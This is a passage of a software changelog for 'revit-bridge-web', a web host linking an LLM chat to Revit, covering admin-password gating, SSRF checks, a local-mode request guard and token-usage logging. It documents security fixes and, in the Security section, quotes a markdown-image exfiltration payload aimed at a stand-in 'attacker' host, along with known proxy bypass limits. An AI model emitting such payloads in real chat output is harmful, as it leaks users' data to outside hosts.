# Changelog

All notable changes to `revit-bridge-web` are recorded here. The format follows
[Keep a Changelog](https://keepachangelog.com/en/1.1.0/); versions follow
[Semantic Versioning](https://semver.org/).

## [Unreleased]

Upgrading: **a host that other machines reach must set `DEPLOY_MODE=cloud` in its `.env` before it
is upgraded**, and keep `ADMIN_PASSWORD` (a cloud host now refuses to start without it). That
includes a host published on loopback behind a reverse proxy or a tunnel on the same machine. The
host now starts as a local host by default (`DEPLOY_MODE=local`): this machine only, no relay, no
pairing, no admin password. Local mode does not detect every proxy: a reverse proxy that adds no
forwarding header and rewrites `Host` to the loopback address - nginx's default `location / {
proxy_pass http://127.0.0.1:7860; }` - passes all of its checks, and the host would then serve pack
edits, skill edits and the logs without a password to anyone the proxy lets in. The only
protections on upgrade are setting `DEPLOY_MODE=cloud` and the startup refusal of a local host that
finds `ADMIN_PASSWORD` (or `CORS_ORIGINS`) set: a site that ran with a password fails closed, one
that ran without it does not. See *Added* and *Changed* (deploy modes).

The host needs `revit-bridge>=0.8,<0.9` (`uv sync`, or rebuild the image). The system
prompt changes (below); questions in the `spec` event may carry `kind` and `blocks`, and a value
`reconcile` cannot find now also comes as a question. Event names and shapes are unchanged.
Set `ADMIN_PASSWORD` to keep changing capability packs from the web UI (see *Security*). If your
`.env` was copied from an older `.env.example`, delete its `FORWARDED_ALLOW_IPS=127.0.0.1` line
when the port is published on loopback behind a proxy on the Docker host (see *Fixed*).

**The model in the chat no longer writes code** (see *Changed*): it runs saved tools only, and code
becomes a tool on the workbench. Built-in packs are now read-only: a client that edited, hid or
replaced one gets 409 `builtin_read_only` (see *Changed*). Started with `uv run revit-bridge-web`,
the host shares your tools with the package's MCP server (see *Changed*).

### Security

- **Changing capability packs needs the admin password.** This changes who may call three
  routes: `PUT /api/v1/bridge/tools/{name}`, `DELETE /api/v1/bridge/tools/{name}` and
  `POST /api/v1/bridge/solidify` now require `X-Admin-Token` (the same check as skill edits,
  `/api/logs` and the device list) and answer 403 `admin_required` without the right one, 503
  `admin_disabled` when `ADMIN_PASSWORD` is unset. Before, any visitor could create, edit or
  delete a pack - the built-in ones included - and a pack's code runs in a designer's Revit
  once they confirm its card. Listing, reading, choices, missing-params, confirming and running
  packs are unchanged. In `docs/api-v1.json` these three operations change (the header, 503,
  the 403 text). The Capabilities page hides *Edit pack* and *Delete*, and the task page's
  *Save as pack* stays off, until the admin password is entered on the Connect page; a host
  without `ADMIN_PASSWORD` cannot change packs through the web UI. The model's tools never
  could (it has no writing tool; a test keeps it so).
- **Three more routes gained a documented status:** `POST /api/v1/bridge/devices/pair`,
  `POST /api/v1/bridge/devices/redeem` and `DELETE /api/v1/bridge/devices/{device_id}` now
  declare 503 `device_store_unavailable` (see *Fixed*). That 503 is the only change to those
  three operations in `docs/api-v1.json`; with the three pack routes above they are the only
  operations whose contract this round of fixes changes.
- The server's model key no longer leaves for a visitor's endpoint. A request with only
  `X-LLM-Base-Url` used to go there with `LLM_API_KEY` in its `Authorization` header. The key
  now only ever goes to `LLM_BASE_URL`: a request that names its own base URL must send
  `X-LLM-Key` too (400 otherwise, nothing sent); a visitor's key or model name alone still uses
  the server's endpoint, as documented. `/config.json` reports `serverModel` only when
  `LLM_BASE_URL`, `LLM_MODEL` and `LLM_API_KEY` are all set.
- A browser-supplied model endpoint must be on a public address: a literal loopback, private,
  link-local, multicast, unspecified or reserved address (IPv4-mapped IPv6, IPv4 inside 6to4,
  Teredo or NAT64, and numeric short forms such as `127.1` or `2130706433` included),
  `localhost` and names under it, or a name that resolves to one, is refused with 400 before
  anything is sent. The host checked is the one httpx connects to, and a URL httpx would refuse
  (a control character, a space in the host) is a 400 too. `LLM_ALLOW_HTTP=1` lifts the
  address check along with the https rule (a model on the operator's own network);
  `LLM_BASE_URL` is never checked. The name is resolved once per request, which does not stop
  DNS rebinding, so a public host should also restrict egress. A redirect from a model endpoint
  is never followed (it is an error).
- Markdown from the model (task page) and from skill files (Capabilities page) renders no
  images: a reply with `![x](https://attacker/?d=...)` made the browser fetch that address.
  An image shows as its alt text; links open in a new tab with `rel="noopener noreferrer"`.

### Added

- **Models by role: `models.yml`**, the one configuration file of the host (`MODELS_FILE`, default
  `DATA_DIR/models.yml`; `models.example.yml` shows it). Each entry is a `base_url` (https, or http
  to loopback - to any host with `LLM_ALLOW_HTTP=1`), a `model` and `api_key_env` - the *name* of the environment variable holding the
  key, read on every call; keys never go in the file, and any other field (`api_key`, `key`,
  `token`, `extra_headers`...) is refused. `roles` maps `analyst`, `planner` (required) and
  `supervisor` to entries; a role left out uses the planner's; all three on one entry is "one model
  for everything". Only the planner runs in this release (the chat); the roles split comes next.
  The file is checked once at startup: a file that is not valid - or missing where `MODELS_FILE`
  points - refuses the start with the file, the field and the problem, never a value from it. A
  key variable that is not set is no startup error (the browser may bring `X-LLM-Key`). **No file
  at the default path changes nothing**: `LLM_*` and the `X-LLM-*` headers as before, the same
  requests to the model and the same stream. With a file, the planner's entry stands where `LLM_*`
  stood and the `X-LLM-*` headers replace that entry, field by field, for the request (the browser
  endpoint check applies to `X-LLM-Base-Url` as before); roles on other entries keep theirs.
  `/config.json` gains `features.models` (each role's model name - no address, no key, no variable
  name; without the file `LLM_MODEL` or `null` for all three) and `features.modelsFile`; with the
  file `serverModel` follows the planner's key variable. The startup log says where the models come
  from and names each role entry whose key variable is not set. `stage`, `usage` and `llm_calls`
  carry the model the call actually went to.
- Connect page: *Models by role*, read-only - the three roles, their model names, and whether they
  come from the host's models file or from the environment and this browser.
- **Token page** (`/token`, a tab next to Evidence): the runs of `GET /api/usage/runs` - time,
  calls, input, cache read, cache write, output, time per run and per role and model - and two
  picked runs side by side with the difference of each count, in total and per role. Unknown
  counts show as `-` and make every total and difference they are part of unknown. Read-only; on a
  cloud host it asks for the admin password, as `/api/logs` does.
- `GET /api/usage/runs` gains `by_role` on each run: the calls and the four sums per role and model,
  in the order of their first call, with the same unknown rule. A new field only; in
  `docs/api-v1.json` the `RolePart` schema, `RunTotal.by_role` and the route's description.
- The workbench's routes (`docs/api-v1.json` gains five operations): `POST /api/v1/bridge/check`
  is the package's `check_code` (compile in Revit, never run, with the lessons for the errors as the
  MCP tool adds them) and `POST /api/v1/bridge/dry-run` its `dry_run_code` (run in the open model and
  always rolled back: no confirmation, no token; one `dry_run` ledger line). Each takes
  `{code, parameters?}` or `{pack, values}` - a draft in the pack format whose template the package
  fills (saved and rendered in a store of fresh temporary directories; 422 `invalid_pack` or
  `render_failed` with the package's messages); any other field, the package's `include` (files on
  the host's machine) among them, is 422. The replies are the package's as they are; code the
  sandbox refuses is answered before Revit is needed, no add-in is 503 `revit_unreachable`, and a
  cloud host counts both against `/spec/confirm`'s rate limit (429 `rate_limited`; a local host
  does not limit them). `POST /api/v1/bridge/choices` `{choices_from}` returns `[{label, value}]`
  from the package's `get_tool_choices`. `GET /api/v1/bridge/tools/{name}/export` returns the pack
  file as stored (`text/yaml`); `POST /api/v1/bridge/tools/import` takes one as YAML text (at most
  256 KB, checked on `Content-Length` before the body is read; YAML aliases, nesting too deep to read
  and keys that are not text are 422 `invalid_pack`), validates it as the package validates a pack
  file (422 `invalid_pack`, 400 `blocked`) and stores it as sent; an existing user pack is replaced
  only with `?overwrite=true` (409 `pack_exists`). Only the current (v1) format imports: an older v0
  file has to be saved once in the current format first. The import is a pack write: admin password
  on a cloud host, none on a local one.
- `GET /api/v1/bridge/tools` and the model's `list_tools` mark each pack `builtin` (true for the
  wheel's) and its `origin` (`"builtin"` or `"user"`); on a local host the page's listing also has
  `directory`, where the file is. Both are read from disk on every call.
- Every tool name from a request or from the model is checked before the store sees it: ASCII
  letters, digits and `_`, not starting with a digit (the shape of the pack schema's parameter
  names, `IDENTIFIER_RE`, without its Unicode letters), at most 100 characters, and no
  Windows device name (`con`, `nul`, `prn`, `aux`, `com0`-`com9`, `lpt0`-`lpt9`, any case; on Windows
  `ToolStore().load("con")` blocks). 422 `invalid_tool_name` from the routes (paths, `POST /solidify`,
  the import, the specs of `/spec/confirm` and `/spec/reconcile`), a result with that error from the
  model's `missing_params`, `get_tool_choices`, `reconcile` and `propose_spec`.
- The Capabilities page has a *Workbench* tab, also at `/capabilities/workbench` (a link opens it):
  for now a note that the workbench editor is being wired in, and your own tools with *Export*,
  *Delete* and *Import*. `frontend/src/api/workbench.ts` is the one HTTP client of the workbench
  (check, dry run, choices, save, list, load, remove, export, import); it sends a draft with
  parameters as `{pack, values}` and asks `/choices` for the options.
- What the host loop does is visible and counted. `/api/chat` sends three more SSE events next
  to the ones it already sent (whose names, shapes and order are unchanged): `event: stage`
  `{role, model, status}` (`start` before the first model call, `end` before `done` or `error`;
  the role is `planner`), `event: tool` `{id, role, name, args, status, ms?, size?, preview?,
  error?}` (`running` when a tool call starts, then `ok` or `error` with the same `id`; `size` is
  the result's length in characters, `preview` its first 2000) and `event: usage` `{role, model,
  round, input, output, cache_read, cache_write, ms}` after every model call. A client that
  ignores unknown events sees no difference. A turn with `bridge: false` sends `stage` and
  `usage` but no `tool`. Arguments whose JSON text runs past 8000 characters go out as
  `{"_truncated": true, "_chars": <length>, "_head": <first 2000 characters>}`; a tool that raised
  reports only the exception's type name (the text goes to the server log); `stage` `end` is sent
  however the turn ends, as long as the client is still there.
- Token usage: every model request asks for it (`stream_options.include_usage`) and the four
  numbers are read from the provider's `usage` object - OpenAI, DeepSeek
  (`prompt_cache_hit_tokens`), the Gemini and Anthropic OpenAI-compatibility endpoints, gateways
  such as OpenRouter, new-api and LiteLLM. `input` is the whole prompt with cached tokens
  included, `cache_read` and `cache_write` the parts served from and written to the provider's
  cache, `output` the completion - thinking tokens included also where the provider counts them
  only in `total_tokens` (Gemini's compatibility endpoint; `output` is then `total_tokens -
  input`). A number the provider does not report, or one that is not an integer from 0 to 2^53,
  is `null`, never 0, and every sum over calls is unknown as soon as one call lacks that number
  (or the sum passes 2^53). Usage objects of one stream are merged field by field. An endpoint
  that answers a 4xx other than 401 / 403 naming `stream_options` is asked once more without
  it; when that is accepted, that address and model are not asked again until the host
  restarts. Known limit: a gateway that always sends `prompt_tokens_details.cached_tokens`
  (new-api sends 0 when the upstream reported nothing) shows a cache read of 0 rather than
  unknown.
- Each model call is a row in the new `llm_calls` table of the interaction log database (session,
  turn, round, role, model name, the four counts, duration, time, run label), created on an
  existing database at startup and purged with the logs after 90 days. No message text, endpoint
  address or key is stored there. The optional request header `X-Run-Label` (1-64 characters of
  `A-Z a-z 0-9 _ . -`, not `.` or `..`; anything else 422 `invalid_args`) names a measured run.
  `GET /api/usage?session_id=` lists the calls of one chat session and `GET /api/usage/runs`
  sums them per run label (calls, the four counts, time, first and last call); both follow the
  `/api/logs` rule (no password on a local host, `X-Admin-Token` on a cloud one). In
  `docs/api-v1.json`: these two operations with their schemas, and the header on `/api/chat`.
- Task page: above every reply of the bridge transcript, its tool activity - one row per tool
  call with the arguments, status, time and result size, expandable to the full arguments and
  the result preview, errors in red - and below the chat a collapsible token panel for this turn
  and this session (input, cache read, hit rate, cache write, output, calls; *unknown* where the
  provider reported nothing). With *Compare with no bridge* on, the no-bridge session has its own
  token panel and no timeline. A row or stage still open when the turn's stream ended (stopped,
  broken off) is marked *interrupted*.
- Deploy modes: `DEPLOY_MODE=local` (default) or `cloud`. A local host serves this machine only:
  it refuses to start when other machines could reach it (`HOST` not loopback; in the image, where
  the server listens on `0.0.0.0`, a `BIND_ADDRESS` not loopback or not passed in), and it has no
  relay, no pairing and no admin password. A cloud host is the host as it was, and refuses to start
  without `ADMIN_PASSWORD`. Both refusals print the reason and exit 2. `/config.json` reports
  `features.mode`. A local host also refuses to start with `ADMIN_PASSWORD` set (a cloud
  deployment missing `DEPLOY_MODE=cloud` fails closed instead of running without a password) or
  with `CORS_ORIGINS` set; `MAX_DEVICES` and `PUBLIC_WS_BASE` given to it are not an error, one
  startup log line names each as unused.
- The request guard of a local host (`backend/localguard.py`), in front of every path (API, static
  files, `/config.json`, `/health`, WebSocket upgrades): 403 `{"error": "local_mode_no_proxy"}` for a
  request carrying `Forwarded`, `X-Forwarded-For`, `X-Forwarded-Host`, `X-Forwarded-Proto`,
  `X-Real-IP` or `CF-Connecting-IP`; 403 `local_mode_host` for a `Host` other than `127.0.0.1`,
  `localhost` or `[::1]` with any port (plus the loopback address configured as `HOST` /
  `BIND_ADDRESS` when it is another one), the guard against DNS rebinding, and - outside a container -
  for a peer address that is not loopback (a server started as `uvicorn backend.main:app --host
  0.0.0.0` is covered too); 403 `local_mode_origin` for any request whose `Sec-Fetch-Site` is
  `cross-site` or `same-site` (another site's page started it: GETs that reach Revit such as
  `/snapshot`, body-less POSTs such as `/trigger-selection`, any method) - except a top-level
  navigation to the page shell or a static file (GET or HEAD, `Sec-Fetch-Mode: navigate`,
  `Sec-Fetch-Dest: document`, not `/api/...`, `/config.json`, `/openapi.json`, `/docs`, `/redoc`
  or `/health`), so a link to the host in a README or a chat tool opens it - and for a POST, PUT,
  PATCH, DELETE or WebSocket upgrade whose `Origin` is not `http://` plus the request's `Host`.
  Every local response carries `Content-Security-Policy: frame-ancestors 'self'` and
  `X-Frame-Options: SAMEORIGIN`: no other page may frame the UI, which has no password.
  Routes without a body (`DELETE /tools/{name}`, `DELETE /api/skills/{id}`, `POST
  /trigger-selection`...) would otherwise take a cross-site form post; routes with a JSON body
  already refuse `text/plain` and form data with 422. A port in `Host` must be ASCII digits. A cloud
  host has no such guard: forwarding headers and public host names are normal behind its proxy.
  Known limits: a reverse proxy that adds no forwarding header and sends a loopback `Host` (nginx's
  default) is not detected; a request relayed by a forward proxy running on the same machine looks
  like a direct browser (loopback peer, rewritten `Host`, no forwarding headers), so a local proxy
  that accepts connections from other machines exposes the host to them - keep such a proxy bound
  to loopback or do not run the host beside it; in Docker the peer-address check is off, so the port
  must be published on the same loopback address as `BIND_ADDRESS` (`-p 127.0.0.1:7860:7860`).
- `npm run dev`: the Vite proxy presents its own pages (`http://localhost:5173`) with the target's
  origin, so the dev page can still make changes on a local host; any other `Origin` passes through
  unchanged and is refused.
- `uv run revit-bridge-web`: the API and the built frontend on `127.0.0.1:7860` without Docker
  (`--host` / `--port` override `HOST` / `PORT` and go through the same check). `pyproject.toml`
  now builds the project (hatchling) so `uv sync` installs it editable with this script; `uv.lock`
  changes only the project's own source line. `python -m backend.main` (the image) is unchanged;
  importing `backend.main` no longer builds the app (`uvicorn backend.main:app` still finds one).
- `get_guidance`, the package's lessons for writing Revit code, as a model tool: the same
  arguments (`mode`, `stage`, `skill_categories`, `revit_categories`, `symbols`, `errors`,
  `exceptions`, `revit_version`, `ids`, `seen_hashes`) and JSON reply as the MCP tool, computed in
  process by `revit_bridge.guidance` on the framework lessons in the wheel plus the company,
  project and personal layers the environment names (`REVIT_BRIDGE_GUIDANCE_COMPANY` /
  `_PROJECT`, `REVIT_BRIDGE_DATA_DIR/guidance`). Read-only; bad arguments and an invalid framework
  layer are results (`invalid_args`, `guidance_invalid`). The description is the MCP tool's
  docstring word for word followed by one host note: "This host has no check_code; use stage=fix
  with the symbols you suspect." A test checks that the description starts with the installed MCP
  tool's docstring and that the parameter names match its signature.
- The task page shows each question's `kind` as a badge (*designer*, *model fact*, *technical*)
  with what it `blocks` in the tooltip. Display only: *Confirm* still follows `reconcile.ready`.
- Paired devices replace the fixed slots: `POST /api/v1/bridge/devices/pair`,
  `POST /devices/redeem` (the add-in, no headers), `GET /devices/{id}`,
  `DELETE /devices/{id}` (revokes and closes the socket), `GET /devices` (admin).
  The relay is keyed by device id, `/ws/{device_id}` requires the add-in's auth
  message within ten seconds and `MAX_DEVICES` (20) caps concurrent connections.
  All of the credential logic is the package's `DeviceStore`: only hashes are
  stored, in `REVIT_BRIDGE_DATA_DIR/auth/devices.json`.
- Every confirmation and every ledger line carries a `scope` - the device it
  belongs to, or `"local"` for the add-in on this machine. A token confirmed for
  one device is refused on another (`mismatch`), `GET /evidence` shows only that
  device's records and `POST /evidence/{id}/validate` answers 404
  `unknown_evidence` for another device's record.
- `POST /execute` asks the designer on the device before running ad-hoc code (the
  package sends `confirm` with the spec card); a No is `success: false,
  error: "declined_on_device"` with the token consumed and a ledger line. A pack
  run is not asked about.
- The Connect page pairs a Revit instead of picking a numbered slot: **Pair a Revit** shows the
  pairing code with its countdown, the install command that carries it and the settings-window
  alternative, then waits (every three seconds, up to ten minutes) for the add-in to redeem it and
  come online. *My devices* lists the devices this browser tab holds keys for - label, online, last
  seen, requests, *Revoke* - and selecting one is what every other page then talks to; the local
  add-in over TCP stays as the other choice. With the admin password, a list of every device on the
  host with the same *Revoke*.

- The host loop: `POST /api/chat` runs the model with the package's read-only tools
  (`get_project_snapshot`, `query`, `list_tools`, `get_tool_choices`, `missing_params`,
  `reconcile`) and `propose_spec` (OpenAI-compatible function calling in `backend/llm.py`).
  `propose_spec` validates and reconciles the draft and pushes `event: spec`
  `{spec, card, errors, reconcile}` to the page; the model gets `{accepted, errors,
  reconcile}`. The model has no `confirm_spec`, `run_tool` or `execute_code`. The page
  reports an execution back with `{execution, session_id}`: the turn starts with
  `event: execution` and the model reports faithfully. `bridge: false` is the comparison
  mode: one plain prompt, no tools, no skills.
- The system prompt is the package's `host_instructions()` plus the enabled skills (which of the
  wheel's are on by default: see *Changed*). The host's own `HOST_INSTRUCTIONS` and the pack
  index in the prompt are gone.
- Sessions keep the model's message history (with tool calls), the last snapshot
  fingerprint, the last proposed spec and the last reported `evidence_id`; never a token.
  A tool result is kept in the session up to 8 KB (head plus a one-line note), a
  `get_guidance` reply up to 16 KB, so the orient lessons (about 12.4 KB) reach later turns
  whole; the turn that produced a result still sends it to the model in full.
- `frontend/src/api/chat.ts`: `parseSseFrame()` and `chatEvents()` yield the host loop's
  events (`session`, `token`, `spec`, `execution`, `error`, `done`); the types are in
  `frontend/src/types/api.ts`.
- The task page is the demo sequence: the snapshot, the brief with the model's questions as
  clickable options, the side-by-side comparison with a `bridge: false` session, the spec card
  from the `spec` event (source and evidence per parameter, the readings as checkboxes,
  conflicts in red, *Confirm* only when the reconciliation is ready), the confirmed execution
  with the validator's checks and a prominent `validation_failed`, the tamper demo (one value
  changed under the same token is `confirmation_invalid`), the report back to the model and
  solidifying code that worked into a v1 pack. The confirmation token lives in the page's
  memory only - never `localStorage` or `sessionStorage`.
- An **Evidence** page: the ledger (`GET /evidence`) with one row per execution, every field of a
  record when it is expanded, and *Validate* (`POST /evidence/{id}/validate`) to re-run its
  assertion against the model as it is now.
- Web API v1 under `/api/v1/bridge`, every route a thin wrapper over `revit-bridge` 0.2:
  `GET /snapshot`, `POST /query`, `POST /tools/{name}/missing-params`,
  `POST /spec/reconcile`, `POST /spec/confirm` (issues the one-time token, channel
  `host_ui`), `GET /evidence`, `POST /evidence/{id}/validate`. The contract is exported
  to `docs/api-v1.json` (CI checks it).
- `tests/fake_revit.py`: a TCP stand-in for the add-in so every route is tested end to
  end without Revit.
- `POST /spec/confirm` is rate limited per client address like `/api/chat`
  (`CHAT_RATE_LIMIT`, its own counter): 429 `{error: rate_limited}`.
- `.env.example` lists, commented out, the other variables the host and `revit-bridge` 0.6.0
  read: `REVIT_BRIDGE_CONFIRM_TTL`, `REVIT_BRIDGE_GUIDANCE_COMPANY` / `_PROJECT`,
  `REVIT_BRIDGE_CAPABILITIES_DIR` / `_EVIDENCE_DIR`, and `DATA_DIR` / `HOST` (both pinned by
  `docker-compose.yml`).
- CI's image job also runs the documented smoke: `docker compose up -d --build` with
  `.env.example` as `.env`, then `/health`, so the env file, the `./data` bind mount and the
  entrypoint's drop to `appuser` are exercised.

### Changed

- **The chat writes no code.** The model's tools lose `get_guidance` (seven tools, 3,444 bytes of
  definitions instead of 5,147), and the system prompt is the package's `host_instructions()` and
  one paragraph of this host's: here the model never writes or proposes code, uses saved tools only
  and, when none fits, says so and links `[workbench](/capabilities/workbench)` (4,288 bytes instead
  of 6,007: no skills, no `get_guidance` pointer). `propose_spec` with an `execute_code` spec shows no
  card and answers `{accepted: false, errors: [{code: "code_not_offered", ...}], reconcile: null}`.
  The Skills page and `/api/skills` stay; the skills no longer enter the prompt. The task page loses
  the free-code execution, the code branch of the tamper demo and the *Solidify* panel; running a
  pack, the spec card, the tamper demo for a value, the timeline and the token panel are unchanged.
- **Built-in packs are read-only.** `PUT` and `DELETE /api/v1/bridge/tools/{name}` on a pack from
  the wheel, and `POST /solidify` or the import under a built-in's name, are 409 `builtin_read_only`
  (before, an edit copied the built-in into the user directory and a delete hid it behind a
  `.disabled` marker) - as long as the user directory has no file of that name. A user file that
  already carries a built-in's name is the designer's own: it can be edited, replaced (import with
  `overwrite=true`, solidify) and deleted, and deleting it brings the built-in back. The
  Capabilities page offers *Edit* and *Delete* for your own packs only; the task page neither
  confirms nor runs a spec that is not `run_tool`, and the Skills page no longer says skills enter
  the prompt.
- **Your tools are shared with the package's MCP server** when the host runs without a container
  (`uv run revit-bridge-web`): it sets no `REVIT_BRIDGE_DATA_DIR`, so the package uses its per-user
  directory, the one its MCP server uses. The 0.1 repair at startup (moving v0 pack files to
  `legacy-0.1/`) now runs only on the host's own `DATA_DIR/capabilities`, never on a shared
  directory, where another host's v0 packs stay where they are. `docker-compose.yml` keeps the tools
  in `./data` as before and has a commented mount (`SHARED_CAPABILITIES_DIR`,
  `REVIT_BRIDGE_CAPABILITIES_DIR=/shared/capabilities`) to share the machine's directory instead;
  `.env.example` no longer sets `REVIT_BRIDGE_DATA_DIR` (compose and the image pin it).
- A chat session keeps the system prompt its first turn was sent with (one per `bridge` value):
  every later call of the session starts with the same bytes - system message, then the tool
  definitions, which were already constant - so a provider's prompt cache keeps matching. A
  skill enabled, edited or turned off meanwhile reaches the next session (*New session* on the
  task page), not the open one. The prompt's text itself is unchanged.
- On a local host: the add-in socket and the device routes (`/api/v1/bridge/ws/{device_id}`,
  `/devices`, `/devices/pair`, `/devices/redeem`, `/devices/{device_id}`) are not mounted and answer
  404 `{"error": "cloud_mode_only", "message": ...}` - the socket before the upgrade; `X-Device-Id`
  / `X-Device-Key` (and the 0.1 slot headers) are not read, so every request, the chat's tools
  included, drives the add-in on this machine and its confirmations and evidence are `local`; the
  admin checks of pack changes, skill writes and `/api/logs` pass without a token
  (`/api/logs/verify` answers `{valid: true}`); `/config.json` has `admin: false`, `maxDevices: 0`
  and an empty `wsBase`; `GET /slots` is `{max_devices: 0, connected: 0}`; `GET /service-health`
  has `remote_relay_ready: false` and `websocket_endpoint: null`; `GET /revit-health` no longer adds
  "0 paired device(s) connected" to its detail. A cloud host answers all of these as before.
- The Connect page of a local host shows the local add-in's check and the model settings only - no
  pairing, no device lists, no admin password field (the components render on a cloud host) - and
  no request carries a device header or the admin token there; pack edit and delete, *Save as
  pack* and the skill editor work without a password. A cloud host's pages are unchanged. A
  `config.json` without `features.mode` (an older static one) is read as a cloud host;
  `frontend/public/config.example.json` says `"mode": "cloud"` and `"admin": true`.
- `docker-compose.yml` sets `DEPLOY_MODE` (default `local`) and passes `BIND_ADDRESS` into the
  container with the same default as the published port; `MAX_DEVICES` is passed empty unless set
  (empty means 20 on a cloud host), so a local host does not report it as unused. The image sets
  `REVIT_BRIDGE_WEB_CONTAINER=1`. Running the image with `docker run` in local mode needs
  `-p 127.0.0.1:7860:7860 -e BIND_ADDRESS=127.0.0.1` (CI's image smoke does that, and checks both
  refusals).
- `docs/api-v1.json` is exported from a cloud host (`DEPLOY_MODE=cloud ADMIN_PASSWORD=...` before
  the export command; CI does the same) and is unchanged: every route is still there.
- Requires `revit-bridge>=0.8,<0.9` (0.8.2 in `uv.lock`; the image installs it from PyPI). From
  0.6.1 to 0.8.2 nothing the host imports changed its name, signature or reply, and no route,
  tool, pack, TaskSpec or gate changed: `docs/api-v1.json` is the same export, `GET /tools` lists
  the same eight packs, and the model's tool definitions and `get_guidance` replies are the same
  byte for byte (the MCP tool's docstring did not change). The tools 0.7 added to the MCP server
  (`dry_run_code`, `test_addin_command`, `zoom_view`, `capture_view`) are not the model's here.
  What the model and the pages now see: the prompt's first line names revit-bridge 0.8, and
  `revit-core` (on by default) has a new section, "Keep Revit interactive", so with the bridge the
  prompt is 6,007 bytes instead of 5,455. The skill list has 44 entries instead of 40: the journal
  skill `revit-journal-analysis` and its three references, all off. The package's JSON stores this
  host writes through it (`usage.json`, `auth/devices.json`) no longer lose an update or end up
  corrupt when two writers meet (0.8.0). When the host and an MCP server share one
  `REVIT_BRIDGE_DATA_DIR`, the Evidence page can also list the server's new ledger lines (`action`
  `dry_run`, `addin_test`, `zoom_view` or `capture_view`; no pack, no *Validate*).
- Before that, in this cycle: `revit-bridge>=0.6,<0.7` (0.6.1). 0.6.1 is the first release whose device store raises when `devices.json` cannot be read, which the pair, redeem and delete-device routes answer with 503. From
  0.4.0 to 0.6.0 no route, tool, pack, TaskSpec or gate changed: `docs/api-v1.json` is the same
  export and `GET /tools` lists the same eight packs. What the pages and the model now see: an
  execution reads the levels once more after the document probe (a pack with preconditions takes
  them from its snapshot), and its ledger line's `document` carries `fingerprint` (the snapshot
  fingerprint; null with a `document: fingerprint skipped` warning when that read fails); a failed
  run whose error names .NET exception types has a `hint` that points at
  `get_guidance(stage="fix", exceptions=[...])`; a value missing from a truncated candidate list is
  a `model_fact` question; `get_guidance` has four more lessons; the prompt's first line names
  revit-bridge 0.6 (still 5,455 bytes). The skill list has 40 entries instead of 29: the phase
  skills `revit-task-brief`, `revit-addin-test` and `revit-addin-release` with their references,
  and `revit-addin-dev`'s `coding-rules`, all off.
- The system prompt no longer carries every `SKILL.md` in the wheel: of 0.4's three skills only
  `revit-core` is on by default, followed by one line that sends the model to `get_guidance` for
  the lessons and names the other categories. The `revit-bridge` protocol is listed but off: it
  describes the MCP server's tool flow (`check_code`, `confirm_spec`, `execute_code`, the
  verification tools), and this host's protocol is the package's `host_instructions()`, which
  opens the prompt. `revit-addin-dev`, references and lessons are listed but off too. A file's
  own `enabled: true` still turns it on. With the bridge the prompt is 6,007 bytes (UTF-8, with
  revit-bridge 0.8.2; 5,455 with 0.6.1); with
  the `revit-bridge` protocol in it, it was 22,348 bytes, and concatenating every `SKILL.md` of
  0.4.0 would have made it 28,918 bytes (13,837 with 0.3.0). A mounted `SKILLS_DIR` is
  unchanged: every file on unless it says otherwise.
  `bridge: false` is unchanged: 145 bytes, no skills, no tools.
- The browser identifies a Revit with `X-Device-Id` + `X-Device-Key` instead of `X-Slot-Id` +
  `X-Slot-Token`; the device id and this browser's key live in `sessionStorage` with the model
  settings, never in `localStorage`. `/config.json` carries `features.maxDevices`; `maxSlots` and
  `slotTokenRequired` are gone, and so is every slot-token field in the UI.

- `POST /tools/{name}/run` and `POST /execute` require the token from
  `POST /spec/confirm` and run through the package's `run_pack` / `run_code`
  (sandbox, preconditions, validator, evidence ledger with `host: "web"`); without a
  token they answer 400 `confirmation_required`, a tampered call is 200
  `confirmation_invalid`, a failed validation 200 `validation_failed`. The reply is the
  MCP `ExecutionResult` shape.
- Executions from the UI go through the gate: the Task page and the Capabilities page both
  build a TaskSpec, confirm it (`POST /spec/confirm`) and run it with the token. The 0.1 path
  (the model writes C# in the chat, the page posts it to `/execute`) is gone, with
  `frontend/src/utils/code.ts`.
- The Capabilities pack list shows the pack's version, validator and preconditions.
- `GET /tools` returns the MCP `list_tools` shape (`name, description, version,
  parameters, preconditions, validator, used`). `POST /solidify` takes v1 parameters
  and an optional `validator`.
- Status codes and error bodies across the bridge routes: 400 for a request the route
  refuses as such (`confirmation_required`, `invalid_category`, `unknown_kind`,
  `blocked`, `no_validator`), 422 for a body that parsed but is not valid
  (`invalid_args`, `invalid_spec`, `invalid_snapshot`, `invalid_pack`), 404 for what
  does not exist (`unknown_tool`, `unknown_evidence`), 503 `revit_unreachable` when no
  add-in answers (was 502), 200 `success: false` for refusals; bodies are
  `{error, message?, ...}` instead of FastAPI's `{detail}`. `docs/api-v1.json`
  declares those statuses per route as `ErrorBody`; FastAPI's own validation errors are
  `invalid_args` on the bridge routes only - `/api/chat`, `/api/skills` and `/api/logs`
  keep `{detail: [...]}`.

- Since `revit-bridge` 0.2.1 (the current requirement is the first entry of this list) the
  package ships eight built-in packs read in place from the wheel, keeps user packs and
  `usage.json` under its own data root, and no longer rewrites pack files to count executions.
- Capability packs come straight from the package's `ToolStore`: built-in packs are
  read from the wheel, user packs live under `REVIT_BRIDGE_DATA_DIR/capabilities`
  (`/app/data` in the container, the `./data` volume). Nothing is copied on first
  start any more; the entrypoint only makes the volume writable.
- Upgrading a 0.1 data volume: pack files without `schema_version` in the user pack
  directory (the copies 0.1 seeded, or packs solidified with 0.1) are moved to
  `capabilities/legacy-0.1/` at startup, one log line per file, nothing deleted, so the
  wheel's rewritten packs are not shadowed by their 0.1 copies.
- `GET /api/v1/bridge/tools` items carry the pack `version`.
- Built-in skills default to the plugin skills shipped in the `revit-bridge` wheel
  (`builtin:revit-bridge/SKILL` and its references); `SKILLS_DIR` is now an optional
  override instead of the only way to get them. The wheel's skills are listed and
  readable but disabled by default (a file's own `enabled: true` wins): `SKILL.md`
  expects the MCP tools this chat does not have yet and the references are read on
  demand, so a fresh install's system prompt is unchanged from 0.1. A mounted
  `SKILLS_DIR` is enabled by default as before.

### Fixed

- Behind the documented setup (port published on loopback, a reverse proxy on the Docker host)
  every visitor shared one address for the rate limits and the logs: requests reach the
  container from the Docker bridge gateway, whose `X-Forwarded-For` was not trusted, so the
  pairing redeem limit (10 a minute) applied to the whole host. The image now trusts
  `127.0.0.1,172.16.0.0/12` (`FORWARDED_ALLOW_IPS`; an explicit value still wins, and outside a
  container the default stays `127.0.0.1`). With `BIND_ADDRESS` not loopback, set
  `FORWARDED_ALLOW_IPS` to the proxy's address, or to `127.0.0.1` with no proxy.
- The container no longer turns "unhealthy" when `.env` sets `HTTP_PROXY` for model calls: the
